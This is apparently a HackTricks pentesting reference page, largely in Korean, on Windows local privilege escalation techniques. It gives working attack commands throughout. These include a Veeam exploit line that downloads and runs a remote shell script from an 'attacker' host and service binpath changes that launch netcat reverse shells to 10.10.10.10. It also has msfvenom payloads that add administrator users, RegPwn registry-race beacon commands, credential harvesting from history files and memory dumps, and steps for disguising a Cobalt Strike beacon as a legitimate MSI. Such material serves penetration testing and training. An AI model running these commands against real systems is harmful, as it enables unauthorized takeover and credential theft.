# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Windows local privilege escalation 벡터를 찾는 데 가장 좋은 tool:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Initial Windows Theory

### Access Tokens

**Windows Access Tokens가 무엇인지 모른다면, 계속하기 전에 다음 페이지를 읽으세요:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs에 대한 자세한 정보는 다음 페이지를 확인하세요:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Windows에서 integrity levels가 무엇인지 모른다면, 계속하기 전에 다음 페이지를 읽으세요:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Windows에는 시스템 열거를 **방해**하거나, 실행 파일을 실행하지 못하게 하거나, 심지어 **활동을 탐지**할 수 있는 여러 가지 요소가 있습니다. privilege escalation 열거를 시작하기 전에 다음 **페이지**를 **읽고**, 이러한 모든 **방어** **메커니즘**을 **열거**해야 합니다:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

`RAiLaunchAdminProcess`를 통해 실행된 UIAccess process는 AppInfo secure-path checks를 우회할 수 있을 때 프롬프트 없이 High IL에 도달하는 데 악용될 수 있습니다. 전용 UIAccess/Admin Protection bypass workflow는 여기서 확인하세요:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop accessibility registry propagation은 임의의 SYSTEM registry write(RegPwn)에 악용될 수 있습니다:

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

## System Info

### Version info enumeration

Windows version에 알려진 취약점이 있는지 확인하세요(적용된 patches도 확인).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

이 [site](https://msrc.microsoft.com/update-guide/vulnerability)는 Microsoft 보안 취약점에 대한 자세한 정보를 검색할 때 유용합니다. 이 database에는 4,700개가 넘는 security vulnerabilities가 있으며, Windows 환경이 제공하는 **massive attack surface**를 보여줍니다.

**On the system**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas has watson embedded)_

**Locally with system information**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos of exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environment

env variables에 저장된 credential/Juicy info가 있나요?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell 기록
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript files

다음에서 이를 켜는 방법을 배울 수 있습니다: [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell pipeline 실행의 세부 정보가 기록되며, 실행된 명령, 명령 호출, 그리고 일부 스크립트가 포함됩니다. 그러나 전체 실행 세부 정보와 출력 결과는 캡처되지 않을 수 있습니다.

이를 활성화하려면 문서의 "Transcript files" 섹션의 지침을 따르되, **"Powershell Transcription"** 대신 **"Module Logging"**을 선택하세요.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
PowersShell 로그의 마지막 15개 이벤트를 보려면 다음을 실행할 수 있습니다:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

스크립트 실행의 완전한 활동과 전체 내용 기록이 캡처되어, 모든 코드 블록이 실행되는 동안 문서화되도록 보장합니다. 이 과정은 각 활동에 대한 포괄적인 감사 추적을 보존하며, 포렌식과 악성 행위 분석에 유용합니다. 실행 시점의 모든 활동을 문서화함으로써, 프로세스에 대한 상세한 통찰을 제공합니다.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block에 대한 로깅 이벤트는 Windows Event Viewer의 다음 경로에서 찾을 수 있습니다: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
마지막 20개의 이벤트를 보려면 다음을 사용할 수 있습니다:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### 인터넷 설정
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### 드라이브
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

업데이트가 http**S**가 아니라 http를 사용하여 요청되는 경우 시스템을 손상시킬 수 있습니다.

다음 명령을 cmd에서 실행하여 네트워크가 비-SSL WSUS 업데이트를 사용하는지 확인하는 것부터 시작합니다:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
또는 PowerShell에서 다음과 같이:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
다음과 같은 응답을 받으면:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
And if `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` or `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` is equals to `1`.

Then, **it is exploitable.** If the last registry is equals to 0, then, the WSUS entry will be ignored.

In orther to exploit this vulnerabilities you can use tools like: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- These are MiTM weaponized exploits scripts to inject 'fake' updates into non-SSL WSUS traffic.

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Basically, this is the flaw that this bug exploits:

> If we have the power to modify our local user proxy, and Windows Updates uses the proxy configured in Internet Explorer’s settings, we therefore have the power to run [PyWSUS](https://github.com/GoSecure/pywsus) locally to intercept our own traffic and run code as an elevated user on our asset.
>
> Furthermore, since the WSUS service uses the current user’s settings, it will also use its certificate store. If we generate a self-signed certificate for the WSUS hostname and add this certificate into the current user’s certificate store, we will be able to intercept both HTTP and HTTPS WSUS traffic. WSUS uses no HSTS-like mechanisms to implement a trust-on-first-use type validation on the certificate. If the certificate presented is trusted by the user and has the correct hostname, it will be accepted by the service.

You can exploit this vulnerability using the tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (once it's liberated).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Many enterprise agents expose a localhost IPC surface and a privileged update channel. If enrollment can be coerced to an attacker server and the updater trusts a rogue root CA or weak signer checks, a local user can deliver a malicious MSI that the SYSTEM service installs. See a generalized technique (based on the Netskope stAgentSvc chain – CVE-2025-0309) here:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` exposes a localhost service on **TCP/9401** that processes attacker-controlled messages, allowing arbitrary commands as **NT AUTHORITY\SYSTEM**.

- **Recon**: confirm the listener and version, e.g., `netstat -ano | findstr 9401` and `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: place a PoC such as `VeeamHax.exe` with the required Veeam DLLs in the same directory, then trigger a SYSTEM payload over the local socket:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
The service executes the command as SYSTEM.
## KrbRelayUp

Windows **domain** 환경에서는 특정 조건에서 **local privilege escalation** 취약점이 존재합니다. 이러한 조건에는 **LDAP signing is not enforced,** 사용자가 **Resource-Based Constrained Delegation (RBCD)** 을 구성할 수 있는 self-rights를 가지고 있으며, 사용자가 도메인 내에서 컴퓨터를 생성할 수 있는 기능이 포함됩니다. 이러한 **requirements** 는 **default settings** 로 충족된다는 점이 중요합니다.

[**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp) 에서 **exploit in** 을 찾으세요.

공격 흐름에 대한 자세한 내용은 [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/) 를 확인하세요.

## AlwaysInstallElevated

이 2개의 registers 가 **enabled** 상태이고 값이 **0x1** 이면, 어떤 권한의 사용자든 `*.msi` 파일을 NT AUTHORITY\\**SYSTEM** 으로 **install**(execute) 할 수 있습니다.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
If you have a meterpreter session you can automate this technique using the module **`exploit/windows/local/always_install_elevated`**

### PowerUP

`Write-UserAddMSI` command from power-up를 사용해 현재 디렉터리 안에 권한 상승을 위한 Windows MSI binary를 생성합니다. 이 스크립트는 사용자/그룹 추가를 요청하는 미리 컴파일된 MSI installer를 작성합니다(따라서 GIU access가 필요합니다):
```
Write-UserAddMSI
```
그냥 생성된 binary를 실행하여 권한을 상승시키세요.

### MSI Wrapper

이 tools를 사용하여 MSI wrapper를 만드는 방법을 배우려면 이 tutorial을 읽으세요. **command lines**를 **그냥** **execute**하려는 경우 **.bat** file을 wrap할 수 있습니다.


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- Cobalt Strike 또는 Metasploit으로 `C:\privesc\beacon.exe`에 **새 Windows EXE TCP payload**를 **Generate**합니다.
- **Visual Studio**를 열고, **Create a new project**를 선택한 다음 검색 상자에 "installer"를 입력합니다. **Setup Wizard** project를 선택하고 **Next**를 클릭합니다.
- 프로젝트 이름을 예를 들어 **AlwaysPrivesc**로 지정하고, location은 **`C:\privesc`**를 사용하며, **place solution and project in the same directory**를 선택한 다음 **Create**를 클릭합니다.
- files to include를 선택하는 4단계 중 3단계에 도달할 때까지 계속 **Next**를 클릭합니다. **Add**를 클릭하고 방금 생성한 Beacon payload를 선택한 다음 **Finish**를 클릭합니다.
- **Solution Explorer**에서 **AlwaysPrivesc** project를 강조 표시하고, **Properties**에서 **TargetPlatform**을 **x86**에서 **x64**로 변경합니다.
- 설치된 app을 더 합법적으로 보이게 할 수 있는 **Author**와 **Manufacturer** 같은 다른 properties도 변경할 수 있습니다.
- project를 오른쪽 클릭하고 **View > Custom Actions**를 선택합니다.
- **Install**을 오른쪽 클릭하고 **Add Custom Action**을 선택합니다.
- **Application Folder**를 더블 클릭하고, `beacon.exe` file을 선택한 다음 **OK**를 클릭합니다. 이렇게 하면 installer가 실행되는 즉시 beacon payload가 execute되도록 보장됩니다.
- **Custom Action Properties**에서 **Run64Bit**를 **True**로 변경합니다.
- 마지막으로, **build it**.
- `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` 경고가 표시되면 platform을 x64로 설정했는지 확인하세요.

### MSI Installation

악성 `.msi` file의 **installation**을 **background**에서 execute하려면:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
이 취약점을 악용하려면 다음을 사용할 수 있습니다: _exploit/windows/local/always_install_elevated_

## Antivirus and Detectors

### Audit Settings

이 설정들은 무엇이 **로그**로 남을지 결정하므로, 주의해야 합니다
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding는 로그가 어디로 전송되는지 알아두면 유용합니다.
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS**는 **로컬 Administrator 비밀번호 관리**를 위해 설계되었으며, 도메인에 가입된 컴퓨터에서 각 비밀번호가 **고유하고, 무작위이며, 정기적으로 업데이트**되도록 보장합니다. 이러한 비밀번호는 Active Directory 내에 안전하게 저장되며, ACL을 통해 충분한 권한을 부여받은 사용자만 접근할 수 있어, 승인된 경우 로컬 admin 비밀번호를 볼 수 있습니다.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

활성화되어 있으면, **평문 비밀번호가 LSASS** (Local Security Authority Subsystem Service)에 저장됩니다.\
[**이 페이지에서 WDigest에 대한 자세한 정보**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

**Windows 8.1**부터 Microsoft는 Local Security Authority (LSA)에 대한 향상된 보호를 도입하여, 신뢰할 수 없는 프로세스가 **메모리를 읽거나** 코드를 주입하려는 시도를 **차단**하고, 시스템 보안을 더욱 강화했습니다.\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard**는 **Windows 10**에서 도입되었습니다. 그 목적은 pass-the-hash 공격과 같은 위협으로부터 장치에 저장된 자격 증명을 보호하는 것입니다.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### 캐시된 자격 증명

**Domain credentials**는 **Local Security Authority** (LSA)에 의해 인증되며 운영 체제 구성 요소에서 사용됩니다. 사용자의 로그온 데이터가 등록된 security package에 의해 인증되면, 일반적으로 해당 사용자의 domain credentials가 설정됩니다.\
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Users & Groups

### Users & Groups 열거

소속된 그룹들 중 흥미로운 권한을 가진 그룹이 있는지 확인해야 합니다
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Privileged groups

**특권 그룹에 속해 있다면 권한 상승이 가능할 수 있습니다**. 특권 그룹과 이를 악용해 권한을 상승시키는 방법에 대해 여기에서 알아보세요:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

이 페이지에서 **token**이 무엇인지 **더 알아보세요**: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
흥미로운 token과 이를 악용하는 방법을 **알아보려면** 다음 페이지를 확인하세요:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Logged users / Sessions
```bash
qwinsta
klist sessions
```
### 홈 폴더
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### 비밀번호 정책
```bash
net accounts
```
### 클립보드의 내용 가져오기
```bash
powershell -command "Get-Clipboard"
```
## Running Processes

### File and Folder Permissions

First of all, listing the processes **프로세스의 command line 안에 passwords가 있는지 확인**하세요.\
일부 실행 중인 binary를 **overwrite**할 수 있는지, 또는 binary folder에 write permissions가 있는지 확인하여 가능한 [**DLL Hijacking attacks**](dll-hijacking/index.html)를 exploit할 수 있는지 확인하세요:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**프로세스 바이너리의 권한 확인**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**프로세스 바이너리의 폴더 권한 확인 (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

**procdump**를 사용하여 실행 중인 프로세스의 메모리 덤프를 만들 수 있습니다. FTP 같은 서비스는 **자격 증명이 메모리에 평문으로** 남아 있을 수 있으니, 메모리를 덤프해서 자격 증명을 읽어 보세요.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Insecure GUI apps

**SYSTEM으로 실행 중인 Applications는 사용자가 CMD를 실행하거나 디렉터리를 탐색하도록 허용할 수 있습니다.**

예: "Windows Help and Support" (Windows + F1)에서 "command prompt"를 검색한 뒤, "Click to open Command Prompt"를 클릭

## Services

Service Triggers를 사용하면 Windows가 특정 조건이 발생할 때(service 시작 조건) service를 시작할 수 있습니다(named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, etc.). SERVICE_START 권한이 없어도 trigger를 발생시켜 권한이 있는 services를 시작할 수 있는 경우가 많습니다. 열거 및 활성화 기법은 여기에서 확인하세요:

-
{{#ref}}
service-triggers.md
{{#endref}}

services 목록을 가져오기:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### 권한

**sc**를 사용하여 서비스에 대한 정보를 얻을 수 있습니다
```bash
sc qc <service_name>
```
각 서비스에 필요한 권한 수준을 확인하기 위해 _Sysinternals_의 바이너리 **accesschk**를 사용하는 것이 권장된다.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
"Authenticated Users"가 어떤 서비스든 수정할 수 있는지 확인하는 것이 권장된다:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### 서비스 활성화

다음 오류가 발생하는 경우(예: SSDPSRV):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

다음을 사용하여 활성화할 수 있습니다
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**XP SP1에서는 서비스 `upnphost`가 작동하려면 `SSDPSRV`에 의존한다는 점을 고려하세요**

**이 문제의 또 다른 우회 방법**은 다음을 실행하는 것입니다:
```
sc.exe config usosvc start= auto
```
### **서비스 바이너리 경로 수정**

"Authenticated users" 그룹이 서비스에 대해 **SERVICE_ALL_ACCESS** 권한을 보유한 경우, 서비스의 실행 바이너리를 수정할 수 있습니다. **sc**를 수정하고 실행하려면:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### 서비스 재시작
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
다양한 권한을 통해 Privileges를 escalated할 수 있습니다:

- **SERVICE_CHANGE_CONFIG**: 서비스 binary의 재구성을 허용합니다.
- **WRITE_DAC**: permission 재구성을 가능하게 하며, 이를 통해 서비스 configuration을 변경할 수 있습니다.
- **WRITE_OWNER**: 소유권 획득과 permission 재구성을 허용합니다.
- **GENERIC_WRITE**: 서비스 configuration을 변경할 수 있는 기능을 상속합니다.
- **GENERIC_ALL**: 역시 서비스 configuration을 변경할 수 있는 기능을 상속합니다.

이 취약점의 detection과 exploitation을 위해 _exploit/windows/local/service_permissions_를 사용할 수 있습니다.

### Services binaries weak permissions

**service가 실행하는 binary를 수정할 수 있는지** 또는 binary가 위치한 folder에 **write permissions**가 있는지 확인하세요 ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
**wmic**를 사용하면 service가 실행하는 모든 binary를 확인할 수 있고(system32는 제외), **icacls**로 permissions를 확인할 수 있습니다:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
또한 **sc** 및 **icacls**를 사용할 수도 있습니다:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### 서비스 registry modify permissions

서비스 registry를 수정할 수 있는지 확인해야 합니다.\
service registry에 대한 **permissions**를 **check**하려면 다음을 수행합니다:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
**Authenticated Users** 또는 **NT AUTHORITY\INTERACTIVE**가 `FullControl` 권한을 가지고 있는지 확인해야 합니다. 그렇다면 서비스가 실행하는 binary를 변경할 수 있습니다.

실행되는 binary의 Path를 변경하려면:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registry symlink race to arbitrary HKLM value write (ATConfig)

일부 Windows Accessibility 기능은 사용자별 **ATConfig** 키를 생성하고, 이후 **SYSTEM** 프로세스가 이를 HKLM session key로 복사합니다. registry **symbolic link race**를 이용하면 이 권한 있는 write를 **임의의 HKLM path**로 우회시킬 수 있어, arbitrary HKLM **value write** primitive를 얻을 수 있습니다.

Key locations (example: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` lists installed accessibility features.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` stores user-controlled configuration.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` is created during logon/secure-desktop transitions and is writable by the user.

Abuse flow (CVE-2026-24291 / ATConfig):

1. Populate the **HKCU ATConfig** value you want to be written by SYSTEM.
2. Trigger the secure-desktop copy (e.g., **LockWorkstation**), which starts the AT broker flow.
3. **Win the race** by placing an **oplock** on `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; when the oplock fires, replace the **HKLM Session ATConfig** key with a **registry link** to a protected HKLM target.
4. SYSTEM writes the attacker-chosen value to the redirected HKLM path.

Once you have arbitrary HKLM value write, pivot to LPE by overwriting service configuration values:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Pick a service that a normal user can start (e.g., **`msiserver`**) and trigger it after the write. **Note:** the public exploit implementation **locks the workstation** as part of the race.

Example tooling (RegPwn BOF / standalone):
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Services registry AppendData/AddSubdirectory permissions

레지스트리에 대해 이 권한이 있으면 **이 레지스트리 아래에 하위 레지스트리를 생성할 수 있다**는 뜻이다. Windows 서비스의 경우, 이는 **임의 코드를 실행하기에 충분하다:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

실행 파일 경로가 따옴표 안에 없으면, Windows는 공백 앞의 모든 경로를 차례로 실행하려고 시도한다.

예를 들어, 경로가 _C:\Program Files\Some Folder\Service.exe_ 이면 Windows는 다음을 실행하려고 시도한다:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
내장 Windows 서비스에 속하는 항목은 제외하고, 모든 unquoted service paths를 나열하세요:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**이 취약점은** metasploit로 탐지하고 익스플로잇할 수 있습니다: `exploit/windows/local/trusted\_service\_path` Metasploit로 서비스 binary를 수동으로 만들 수 있습니다:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
